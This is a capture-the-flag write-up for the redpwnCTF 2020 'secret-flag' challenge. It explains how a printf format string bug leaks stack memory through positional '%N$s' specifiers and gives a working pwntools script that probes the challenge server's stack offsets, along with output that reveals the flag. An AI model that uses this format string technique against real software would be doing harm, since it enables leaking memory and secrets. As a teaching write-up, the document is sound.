# secret-flag
This is a typical `printf()` exploit as the challenge hints us
```
There's a super secret flag in printf that allows you to LEAK the data at an address??
```
## printf
Printf is the format string function, by using different flags, we can get different types of variables. If nothing is specified to be the input and there fore nothing is placed on the stack, if we insert flags to printf, it will just read the data on the top of the stack down.
We can use this "bug" to lead as much data as we want.

## the exploit
We want to leak the values on the stack. First I tried to use the flags and see what we can get, but there is a twist
```
What is your name, young adventurer?
%s %s %s      
Hello there: Hello there:  (null) (null)
```
This one works out nicely, but check what happens when I enter more that 3 `%s`
```
What is your name, young adventurer?
%s %s %s %s
Hello there: [1]    3000 segmentation fault (core dumped)  ./secret-flag
```
The program crashes! Apparently the flag should hid down the stack, but how can we get over this?
Well we could use `% #number $s`, the number is how far you want to look back on the stack. By doing this, we could just request one stack location at a time but we can do this many times. So I wrote a script to do this

## script
```python
from pwn import *
context.log_level='critical'
host,port="2020.redpwnc.tf",31826
for i in range(10):
    s=remote(host,port)
    s.recvline()
    s.recvline()
    s.sendline('%'+str(i)+'$s')
    try:
        responce=s.recvline().decode("utf-8")
        print(responce)
    except:
        print("Fault")
```
This is a simple script that crawls through `1-10` on the stack by running `%5$s` to find strings(we want string because the flag should be a string). We try to decode the recieve text to readable characters, and if it doesn't work, we just pass.
OUTPUT:
```
Hello there: %0$s

Hello there: Hello there: 

Hello there: 

Fault
Hello there: 

Fault
Fault
Hello there: flag{n0t_s0_s3cr3t_f1ag_n0w}

Fault
Fault
```
And theres the flag on the stack somewhere!
